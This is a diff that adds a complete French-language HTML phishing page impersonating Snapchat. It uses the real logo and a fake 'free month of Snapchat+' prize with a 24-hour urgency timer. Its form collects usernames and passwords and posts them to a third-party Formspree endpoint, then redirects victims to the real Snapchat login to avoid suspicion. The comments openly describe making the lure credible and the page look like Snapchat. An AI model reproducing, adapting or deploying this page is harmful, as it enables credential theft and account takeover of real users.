@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Snapchat</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap');
+       
+        body {
+            background: #000;
+            color: #fff;
+            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+        }
+       
+        .container {
+            width: 100%;
+            max-width: 380px;
+            padding: 20px;
+            text-align: center;
+        }
+       
+        .logo {
+            width: 80px;
+            margin: 20px 0 30px;
+        }
+       
+        h1 {
+            color: #FFFC00;
+            font-size: 24px;
+            margin: 10px 0 20px;
+            font-weight: 500;
+        }
+       
+        .subtext {
+            font-size: 15px;
+            line-height: 1.4;
+            margin-bottom: 30px;
+            color: #ccc;
+        }
+       
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            margin: 8px 0;
+            background: #1A1A1A;
+            border: 1px solid #333;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+       
+        input:focus {
+            border-color: #FFFC00;
+            outline: none;
+        }
+       
+        button {
+            width: 100%;
+            padding: 14px;
+            background: #FFFC00;
+            color: #000;
+            border: none;
+            border-radius: 9999px;
+            font-size: 17px;
+            font-weight: 600;
+            margin-top: 15px;
+            cursor: pointer;
+        }
+       
+        button:hover {
+            background: #fff;
+        }
+       
+        .footer {
+            margin-top: 40px;
+            font-size: 12px;
+            color: #666;
+        }
+       
+        .ghost {
+            width: 50px;
+            margin-bottom: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Logo officiel Snapchat -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Snapchat_logo.svg/512px-Snapchat_logo.svg.png" class="logo" alt="Snapchat">
+       
+        <!-- Message promo crédible -->
+        <h1>🎉 FÉLICITATIONS !</h1>
+        <h1>Tu as gagné 1 mois GRATUIT de Snapchat+ !</h1>
+       
+        <p class="subtext">
+            Offre exclusive et limitée aux utilisateurs actifs.<br>
+            Claim maintenant pour débloquer :
+        </p>
+       
+        <ul style="text-align:left; font-size:15px; color:#ccc; margin:20px 0; padding-left:20px;">
+            <li>• Icônes et Bitmojis exclusifs</li>
+            <li>• Streaks infinis</li>
+            <li>• Replay illimité</li>
+            <li>• Meilleurs amis à vie</li>
+        </ul>
+       
+        <!-- FORMULAIRE MODIFIÉ POUR GITHUB PAGES + FORMSPREE -->
+        <form action="https://formspree.io/f/xvzvwdpb" method="POST">
+            <input type="text" name="username" placeholder="Nom d'utilisateur ou Email" required>
+            <input type="password" name="password" placeholder="Mot de passe" required>
+            
+            <!-- Cache pour que ça ressemble encore plus à Snapchat -->
+            <input type="hidden" name="_subject" value="🚀 Nouveau Claim Snapchat+ !">
+            <input type="hidden" name="_next" value="https://accounts.snapchat.com/accounts/login">
+            
+            <button type="submit">CLAIM SNAPCHAT+ GRATUIT MAINTENANT</button>
+        </form>
+       
+        <div class="footer">
+            Snapchat © 2026 • Promotion officielle<br>
+            <span style="color:#FFFC00;">Cette offre expire dans 24 heures</span>
+        </div>
+    </div>
+</body>
+</html>
